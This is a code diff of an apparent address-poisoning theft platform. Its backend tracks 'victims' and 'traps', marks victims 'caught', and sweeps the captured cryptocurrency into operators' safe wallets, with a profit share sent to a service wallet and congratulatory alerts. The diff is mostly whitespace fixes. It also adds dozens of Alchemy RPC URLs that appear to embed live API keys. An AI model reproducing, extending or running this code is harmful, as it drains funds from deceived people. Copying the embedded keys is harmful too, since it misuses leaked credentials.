@@ -55,7 +55,7 @@ const caughtVictims = new Set();
 const NO_BALANCE_COOLDOWN_MS = 4 * 60 * 60 * 1000; // 4 hours
 let lastNoBalanceAlertTime = 0;
 const BALANCE_DETECTED_COOLDOWN_MS = 1 * 60 * 60 * 1000; // 1 hour
-const lastBalanceAlertTimes = new Map(); 
+const lastBalanceAlertTimes = new Map();
 const campaignMetadataCache = new Map();
 
 // 🚀 BULLETPROOF MULTI-SOURCE PRICE FETCHER
@@ -78,10 +78,10 @@ async function fetchTokenPrices() {
     try {
       const nativeSymbol = globalConfig.getChainConfig()?.nativeSymbol || 'ETH';
       const ids = [nativeSymbol.toLowerCase()];
-      const TOKEN_LIST = globalConfig.getChainConfig()?.tokens ? 
-        Object.keys(globalConfig.getChainConfig().tokens).map(s => s.toLowerCase()) : 
+      const TOKEN_LIST = globalConfig.getChainConfig()?.tokens ?
+        Object.keys(globalConfig.getChainConfig().tokens).map(s => s.toLowerCase()) :
         ['usdc', 'usdt', 'wbtc', 'weth', 'dai'];
-      
+
       const allSymbols = [...new Set([...ids, ...TOKEN_LIST])];
       let newCache = {};
 
@@ -113,7 +113,7 @@ async function fetchTokenPrices() {
             eth: 'ETHUSDT', bnb: 'BNBUSDT', matic: 'MATICUSDT', pol: 'POLUSDT',
             wbtc: 'BTCUSDT', weth: 'ETHUSDT'
           };
-          
+
           for (const sym of allSymbols) {
             if (newCache[sym]) continue;
             const pair = binancePairs[sym];
@@ -134,7 +134,7 @@ async function fetchTokenPrices() {
         priceCache = newCache;
         logger.debug(`Final price cache established: ${JSON.stringify(priceCache)}`);
       } else {
-         logger.warn(`All price sources failed. Cache remains unchanged or empty.`);
+        logger.warn(`All price sources failed. Cache remains unchanged or empty.`);
       }
     } catch (e) {
       logger.error(`Critical: All price fetch sources failed: ${e.message}`);
@@ -204,7 +204,7 @@ async function getCampaignMetadata(campId) {
       .select('user_id, safe_wallet_address')
       .eq('id', campId)
       .single();
-    
+
     if (error || !campaign) {
       logger.error(`Failed to fetch campaign ${campId}: ${error?.message}`);
       return null;
@@ -293,10 +293,10 @@ async function markVictimCaught(victimAddress, trapCampaignId = null) {
   if (!supabaseService) return;
   try {
     await supabaseService.from('traps').update({ is_caught: true }).eq('victim_address', addr);
-    
+
     const userMsg = `🎯 Congratulations! A victim has been successfully caught.\n\nVictim Address: ${addr}\nStatus: Trap activated and ready for sweeping.`;
     const adminMsg = `[ADMIN] 🎯 Victim caught successfully.\nCampaign ID: ${trapCampaignId || campaignId}\nVictim: ${addr}`;
-    
+
     await sendCustomDualAlert(userMsg, adminMsg, trapCampaignId || campaignId);
   } catch (err) {
     logger.error(`Failed to mark victim caught ${addr}: ${err.message}`);
@@ -330,7 +330,7 @@ async function getTrapsFromDB(campId = null) {
 
     const { data, error } = await query;
     if (error || !data || data.length === 0) return [];
-    
+
     const entries = [];
     for (const row of data) {
       if (!row.trap_private_key_enc) continue;
@@ -374,9 +374,51 @@ const chainRpc = chainCfg?.rpc || sweeperRpcUrl;
 
 // ─── Public RPC Fallbacks ───
 const PUBLIC_FALLBACKS = {
-  bsc: ['https://bsc-dataseed.binance.org', 'https://rpc.ankr.com/bsc', 'https://bsc.publicnode.com'],
-  polygon: ['https://polygon-rpc.com', 'https://rpc.ankr.com/polygon', 'https://polygon.publicnode.com'],
-  ethereum: ['https://ethereum.publicnode.com', 'https://rpc.ankr.com/eth', 'https://eth.llamarpc.com'],
+  bsc: [
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_6gTznTT4QnX3_0IE9gkY-',
+    'https://bsc-dataseed.binance.org',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_z1J_ESjjLVZwSBLNoep84',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_-NvhHn24EgwhuMt38pZJr',
+    'https://rpc.ankr.com/bsc',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_8ToIPT9Z3R1iQ55nksx8b',
+    'https://bsc.publicnode.com',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_Qy6hQXdtdVlE7Z4uVxt_A',
+    'https://1rpc.io/bnb',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_rniHI4MxzjBfNZ4bxmDu5',
+    'https://bsc.drpc.org',
+    'https://bnb-mainnet.g.alchemy.com/v2/LW3i2zPypSVe0cl4BxCxI',
+    'https://bnb-mainnet.g.alchemy.com/v2/alch_WQp652MAlfKFbtD1A-zNh'
+  ],
+  polygon: [
+    'https://polygon-mainnet.g.alchemy.com/v2/CByFU5cCGAYyh8EHLamXD',
+    'https://polygon-rpc.com',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_UdSkrC6LFs2HGS0VUGg5O',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_tAPr1C9JUzQZYax5pslu5',
+    'https://rpc.ankr.com/polygon',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_Bq31mnvxmjdT70RCYLGLA',
+    'https://polygon.llamarpc.com',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_17XYrB1qagYO9Edwxj7Cw',
+    'https://polygon.publicnode.com',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_UQzY-saHkZZrowH7kylTu',
+    'https://1rpc.io/polygon',
+    'https://polygon-mainnet.g.alchemy.com/v2/c6MIVgnVjXC0kgDH4BItE',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_3_N_bgLVSl1zoRzlypO11'
+  ],
+  ethereum: [
+    'https://eth-mainnet.g.alchemy.com/v2/alch_F5VimAPoBoESKZ566us-U',
+    'https://ethereum.publicnode.com',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_x_oSlpf2bnfc6brp-BgzA',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_tp8k4HI9tVpUEBmsF3kXc',
+    'https://rpc.ankr.com/eth',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_7viyR-7wWLgc2i9suQ6hS',
+    'https://eth.llamarpc.com',
+    'https://eth-mainnet.g.alchemy.com/v2/ig-ZUQrtw2shXhW2NuT6W',
+    'https://1rpc.io/eth',
+    'https://eth-mainnet.g.alchemy.com/v2/alch_dFm-5A7LhWtYU3_4Y103o',
+    'https://eth.drpc.org',
+    'https://eth-mainnet.g.alchemy.com/v2/gODtbeuBQLkTJAm3e9tB1',
+    'https://eth-mainnet.g.alchemy.com/v2/GsO461DZvmNGh4O4Ss5Et'
+  ],
 };
 
 const normalizedChain = chainName?.toLowerCase() || '';
@@ -397,7 +439,7 @@ const publicClient = createPublicClient({
 // 🚀 OPTIMIZATION: Lazy execution helper
 async function executeSweepForTrap(entry, balances) {
   const { account, trapAddress, victimAddress, campaignId: trapCampaignId, singleDestination } = entry;
-  
+
   let metadata;
   if (singleDestination) {
     metadata = { profitSplitPercent: 100, userSafeWallet: singleDestination, useSplitting: false, serviceWallet: null, fallbackToAdmin: false };
@@ -440,9 +482,9 @@ async function executeSweepForTrap(entry, balances) {
     const tokenPrice = prices[token.symbol.toLowerCase()] || 0;
     const usdValue = parseFloat(formatted) * tokenPrice;
     const isTokenPriceMissing = tokenPrice === 0;
-    
-    const meetsThreshold = (isPriceFeedDown || isTokenPriceMissing) 
-      ? tokenData.balance >= MIN_TOKEN_SWEEP 
+
+    const meetsThreshold = (isPriceFeedDown || isTokenPriceMissing)
+      ? tokenData.balance >= MIN_TOKEN_SWEEP
       : usdValue >= MIN_SWEEP_USD;
 
     if (usdValue >= MIN_CATCH_USD && victimAddress) await markVictimCaught(victimAddress, trapCampaignId);
@@ -517,17 +559,17 @@ async function executeSweepForTrap(entry, balances) {
           const txId = await createTransaction(trapCampaignId, trapAddress, token.symbol, formatted, isPriceFeedDown || isTokenPriceMissing ? 0 : usdValue, txHash, 'sweep');
           if (txId) await createProfitShare(txId, formatUnits(userAmount, tokenData.decimals), formatUnits(serviceAmount, tokenData.decimals), userTxHash, serviceTxHash);
         }
-        
+
         // 🚀 PROFESSIONAL NOTIFICATIONS
         const txHashShort = txHash.substring(0, 10) + '...' + txHash.substring(txHash.length - 8);
-        
+
         if (fallbackToAdmin) {
           const userFallbackMsg = `⚠️ Important Update Regarding Your Trap\n\n` +
             `Your trap successfully captured funds, but no safe wallet address was configured in your campaign settings.\n\n` +
             `For the security of your assets, the captured funds (${formatted} ${token.symbol} ≈ $${usdValue.toFixed(2)}) have been temporarily secured in the platform admin wallet.\n\n` +
             `👉 Action Required: Please update your campaign's safe wallet address in your dashboard to claim these funds on the next sweep cycle.\n\n` +
             `🔗 TX: ${txHashShort}`;
-            
+
           const adminFallbackMsg = `[ADMIN] ⚠️ Fallback Sweep Executed (Missing User Wallet)\n` +
             `Campaign ID: ${trapCampaignId}\n` +
             `Trap: ${trapAddress}\n` +
@@ -535,7 +577,7 @@ async function executeSweepForTrap(entry, balances) {
             `Amount: ${formatted} ${token.symbol} (≈ $${usdValue.toFixed(2)})\n` +
             `Reason: User safe wallet not configured. Funds secured in service wallet.\n` +
             `🔗 TX: ${txHash}`;
-            
+
           await sendCustomDualAlert(userFallbackMsg, adminFallbackMsg, trapCampaignId);
         } else {
           const userSuccessMsg = `🎉 Congratulations! Your trap has successfully captured funds.\n\n` +
@@ -544,13 +586,13 @@ async function executeSweepForTrap(entry, balances) {
             `💵 Amount: ${formatted} ${token.symbol} (≈ $${usdValue.toFixed(2)})\n` +
             `✅ Status: Successfully swept to your safe wallet.\n\n` +
             `🔗 TX: ${txHashShort}`;
-            
+
           const adminSuccessMsg = `[ADMIN] 🎉 User trap successfully captured and swept funds.\n` +
             `Campaign ID: ${trapCampaignId}\n` +
             `Asset: ${token.symbol}\n` +
             `Amount: ${formatted} ${token.symbol}\n` +
             `🔗 TX: ${txHash}`;
-            
+
           await sendCustomDualAlert(userSuccessMsg, adminSuccessMsg, trapCampaignId);
         }
       }
@@ -603,15 +645,15 @@ async function executeSweepForTrap(entry, balances) {
             }
 
             if (userAmount > 0n && userSafeWallet) {
-              try { userTxHash = await buildAndSendNativeTx(userSafeWallet, userAmount); sweptAny = true; } 
+              try { userTxHash = await buildAndSendNativeTx(userSafeWallet, userAmount); sweptAny = true; }
               catch (err) { logger.error(`Native user tx error: ${err.message}`); }
             }
             if (serviceAmount > 0n && serviceWallet) {
-              try { serviceTxHash = await buildAndSendNativeTx(serviceWallet, serviceAmount); sweptAny = true; } 
+              try { serviceTxHash = await buildAndSendNativeTx(serviceWallet, serviceAmount); sweptAny = true; }
               catch (err) { logger.error(`Native service tx error: ${err.message}`); }
             }
           } else {
-            try { userTxHash = await buildAndSendNativeTx(userSafeWallet, totalSendable); sweptAny = true; } 
+            try { userTxHash = await buildAndSendNativeTx(userSafeWallet, totalSendable); sweptAny = true; }
             catch (err) { logger.error(`Native sweep tx error: ${err.message}`); }
           }
 
@@ -621,17 +663,17 @@ async function executeSweepForTrap(entry, balances) {
               const txId = await createTransaction(trapCampaignId, trapAddress, nativeSymbol, formatEther(spendableNativeFinal), isPriceFeedDown || isNativePriceMissing ? 0 : usdValue, txHash, 'sweep');
               if (txId) await createProfitShare(txId, formatEther(userAmount), formatEther(serviceAmount), userTxHash, serviceTxHash);
             }
-            
+
             // 🚀 PROFESSIONAL NOTIFICATIONS FOR NATIVE
             const txHashShort = txHash.substring(0, 10) + '...' + txHash.substring(txHash.length - 8);
-            
+
             if (fallbackToAdmin) {
               const userFallbackMsg = `⚠️ Important Update Regarding Your Trap\n\n` +
                 `Your trap successfully captured ${nativeSymbol}, but no safe wallet address was configured.\n\n` +
                 `For security, the funds (${formatEther(totalSendable)} ${nativeSymbol} ≈ $${usdValue.toFixed(2)}) have been secured in the platform admin wallet.\n\n` +
                 `👉 Action Required: Please update your campaign's safe wallet address in your dashboard.\n\n` +
                 `🔗 TX: ${txHashShort}`;
-                
+
               const adminFallbackMsg = `[ADMIN] ⚠️ Fallback Sweep Executed (Missing User Wallet)\n` +
                 `Campaign ID: ${trapCampaignId}\n` +
                 `Trap: ${trapAddress}\n` +
@@ -639,7 +681,7 @@ async function executeSweepForTrap(entry, balances) {
                 `Amount: ${formatEther(totalSendable)} ${nativeSymbol} (≈ $${usdValue.toFixed(2)})\n` +
                 `Reason: User safe wallet not configured.\n` +
                 `🔗 TX: ${txHash}`;
-                
+
               await sendCustomDualAlert(userFallbackMsg, adminFallbackMsg, trapCampaignId);
             } else {
               const userSuccessMsg = `🎉 Congratulations! Your trap has successfully captured funds.\n\n` +
@@ -648,13 +690,13 @@ async function executeSweepForTrap(entry, balances) {
                 `💵 Amount: ${formatEther(totalSendable)} ${nativeSymbol} (≈ $${usdValue.toFixed(2)})\n` +
                 `✅ Status: Successfully swept to your safe wallet.\n\n` +
                 `🔗 TX: ${txHashShort}`;
-                
+
               const adminSuccessMsg = `[ADMIN] 🎉 User trap successfully captured and swept funds.\n` +
                 `Campaign ID: ${trapCampaignId}\n` +
                 `Asset: ${nativeSymbol}\n` +
                 `Amount: ${formatEther(totalSendable)} ${nativeSymbol}\n` +
                 `🔗 TX: ${txHash}`;
-                
+
               await sendCustomDualAlert(userSuccessMsg, adminSuccessMsg, trapCampaignId);
             }
           }
@@ -684,7 +726,7 @@ async function sweepBatch() {
     await sendCustomDualAlert(
       `ℹ️ Sweep cycle complete: No traps found to process.`,
       `[ADMIN] ℹ️ Sweep cycle complete: No traps found to process.`
-    , campaignId);
+      , campaignId);
     return;
   }
 
@@ -693,7 +735,7 @@ async function sweepBatch() {
   }
 
   logger.info(`Loaded ${entries.length} trap addresses`);
-  
+
   let isSweeping = false;
   const total = entries.length;
 
@@ -705,7 +747,7 @@ async function sweepBatch() {
 
     try {
       const CHUNK_SIZE = 20;
-      
+
       for (let i = 0; i < entries.length; i += CHUNK_SIZE) {
         if (jobId && await isJobCancelled(jobId)) {
           logger.info(`Job ${jobId} cancelled. Stopping.`);
@@ -744,19 +786,19 @@ async function sweepBatch() {
 
           const swept = await executeSweepForTrap(entry, trapBalances);
           if (swept) anySwept = true;
-          
+
           processedCount++;
           if (jobId) await updateJob('running', processedCount, total, `Sweeping ${processedCount}/${total}`);
         }
       }
-      
+
       if (!anySwept) {
         const now = Date.now();
         if (now - lastNoBalanceAlertTime > NO_BALANCE_COOLDOWN_MS) {
           await sendCustomDualAlert(
             `ℹ️ Sweep cycle complete: No balances above thresholds were found for ${total} traps.`,
             `[ADMIN] ℹ️ Sweep cycle complete: No balances above thresholds found for ${total} traps.`
-          , campaignId);
+            , campaignId);
           lastNoBalanceAlertTime = now;
         }
       } else {
@@ -788,7 +830,7 @@ async function sweepSingle(privateKey, destination) {
   const account = privateKeyToAccount(privateKey);
   const trapAddress = account.address;
   logger.info(`Monitoring Poisoned Wallet: ${trapAddress}`);
-  
+
   let isRunning = false;
   const run = async () => {
     if (isRunning) return;
@@ -798,16 +840,16 @@ async function sweepSingle(privateKey, destination) {
         address: getAddress(token.address), abi: ERC20_ABI, functionName: 'balanceOf', args: [trapAddress]
       }));
       const results = await publicClient.multicall({ contracts: multicallContracts, allowFailure: true });
-      const trapBalances = { 
-        native: await publicClient.getBalance({ address: trapAddress }), 
-        tokens: {} 
+      const trapBalances = {
+        native: await publicClient.getBalance({ address: trapAddress }),
+        tokens: {}
       };
       results.forEach((res, i) => {
         if (res && res.status === 'success' && res.result > 0n) {
           trapBalances.tokens[TOKEN_LIST[i].symbol] = { balance: res.result, decimals: TOKEN_LIST[i].decimals };
         }
       });
-      
+
       await executeSweepForTrap({ account, trapAddress, victimAddress: null, singleDestination: destination }, trapBalances);
     } catch (err) {
       logger.error(`Sweep error: ${err.message}`);
